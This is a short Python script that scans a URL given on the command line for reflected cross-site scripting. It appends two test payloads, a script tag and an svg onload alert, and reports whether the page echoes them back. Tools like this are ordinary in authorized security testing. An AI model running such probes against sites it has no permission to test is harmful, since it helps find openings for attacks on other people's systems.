import requests
import sys

url = sys.argv[1]
payloads = ["<script>alert(1)</script>", "\"<svg/onload=alert(1)>\""]

for payload in payloads:
    response = requests.get(f"{url}{payload}")
    if payload in response.content.decode():
        print(f"[!] XSS vulnerability discovered with payload: {payload}")